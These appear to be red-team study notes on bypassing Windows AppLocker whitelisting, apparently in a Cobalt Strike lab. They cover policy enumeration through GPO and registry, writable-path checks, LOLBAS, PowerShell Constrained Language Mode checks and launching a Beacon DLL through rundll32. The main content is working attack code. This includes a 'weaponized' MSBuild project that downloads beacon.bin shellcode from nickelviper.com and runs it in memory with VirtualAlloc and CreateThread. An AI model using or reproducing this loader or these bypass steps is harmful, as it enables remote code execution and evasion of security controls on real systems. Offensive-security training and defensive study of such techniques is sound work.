# Application Whitelisting Notes

**Policy Enumeration**

policy can be read from the GPO or the local registry
```
powershell Get-DomainGPO -Domain dev-studio.com | ? { $_.DisplayName -like "*AppLocker*" } | select displayname, gpcfilesyspath
download \\dev-studio.com\SysVol\dev-studio.com\Policies\{GPO}\Machine\Registry.pol
registry search:
Get-ChildItem "HKLM:Software\Policies\Microsoft\Windows\SrpV2"
Get-ChildItem "HKLM:Software\Policies\Microsoft\Windows\SrpV2\<policy to check from above>"
```

**Writeable paths**

use get-acl to check if you have permissions to write
```
powershell Get-Acl C:\Windows\Tasks | fl
```

**Living Off The Land Binaries, Scripts and Libraries**
Tools:
[LOLBAS](https://lolbas-project.github.io/)

example with MSBuild that runs and says Hello World
```
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="MSBuild">
   <MSBuildTest/>
  </Target>
   <UsingTask
    TaskName="MSBuildTest"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
     <Task>
      <Code Type="Class" Language="cs">
        <![CDATA[

            using System;
            using Microsoft.Build.Framework;
            using Microsoft.Build.Utilities;

            public class MSBuildTest : Task, ITask
            {
                public override bool Execute()
                {
                    Console.WriteLine("Hello World");
                    return true;
                }
            }

        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
```

Weaponized with shellcode injection
```
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="MSBuild">
   <MSBuildTest/>
  </Target>
   <UsingTask
    TaskName="MSBuildTest"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
     <Task>
      <Code Type="Class" Language="cs">
        <![CDATA[

            using System;
            using System.Net;
            using System.Runtime.InteropServices;
            using Microsoft.Build.Framework;
            using Microsoft.Build.Utilities;

            public class MSBuildTest :  Task, ITask
            {
                public override bool Execute()
                {
                    byte[] shellcode;
                    using (var client = new WebClient())
                    {
                        client.BaseAddress = "http://nickelviper.com";
                        shellcode = client.DownloadData("beacon.bin");
                    }
      
                    var hKernel = LoadLibrary("kernel32.dll");
                    var hVa = GetProcAddress(hKernel, "VirtualAlloc");
                    var hCt = GetProcAddress(hKernel, "CreateThread");

                    var va = Marshal.GetDelegateForFunctionPointer<AllocateVirtualMemory>(hVa);
                    var ct = Marshal.GetDelegateForFunctionPointer<CreateThread>(hCt);

                    var hMemory = va(IntPtr.Zero, (uint)shellcode.Length, 0x00001000 | 0x00002000, 0x40);
                    Marshal.Copy(shellcode, 0, hMemory, shellcode.Length);

                    var t = ct(IntPtr.Zero, 0, hMemory, IntPtr.Zero, 0, IntPtr.Zero);
                    WaitForSingleObject(t, 0xFFFFFFFF);

                    return true;
                }

            [DllImport("kernel32", CharSet = CharSet.Ansi)]
            private static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)]string lpFileName);
    
            [DllImport("kernel32", CharSet = CharSet.Ansi)]
            private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

            [DllImport("kernel32")]
            private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            private delegate IntPtr AllocateVirtualMemory(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            private delegate IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

            }

        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
```

**Powershell CLM**

If you try to run a script or command in PowerShell and see an error like "only core types in this language mode", then you know you're operating in a restricted environment

check languagemodes, powerpick uses unmanaged powershell runspace and an applocker bypass to execute on beacon
```
powershell $ExecutionContext.SessionState.LanguageMode
powerpick $ExecutionContext.SessionState.LanguageMode
```

This can also be done in C# (using MSBuild as the example again)
```
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="MSBuild">
   <MSBuildTest/>
  </Target>
   <UsingTask
    TaskName="MSBuildTest"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
     <Task>
     <Reference Include="System.Management.Automation" />
      <Code Type="Class" Language="cs">
        <![CDATA[

            using System;
            using System.Linq;
            using System.Management.Automation;
            using System.Management.Automation.Runspaces;

            using Microsoft.Build.Framework;
            using Microsoft.Build.Utilities;

            public class MSBuildTest :  Task, ITask
            {
                public override bool Execute()
                {
                    using (var runspace = RunspaceFactory.CreateRunspace())
                    {
                      runspace.Open();

                      using (var posh = PowerShell.Create())
                      {
                        posh.Runspace = runspace;
                        posh.AddScript("$ExecutionContext.SessionState.LanguageMode");
                                                
                        var results = posh.Invoke();
                        var output = string.Join(Environment.NewLine, results.Select(r => r.ToString()).ToArray());
                        
                        Console.WriteLine(output);
                      }
                    }

                return true;
              }
            }

        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
```

**Beacon DLL**

As previously mentioned, DLL enforcement is not commonly enabled which allows us to call exported functions from DLLs on disk via rundll32.  Beacon's DLL payload exposes several exports including DllMain and StartW.  These can be changed in the Artifact Kit under src-main, dllmain.def.
```
C:\Windows\System32\rundll32.exe http_x64.dll,StartW
```




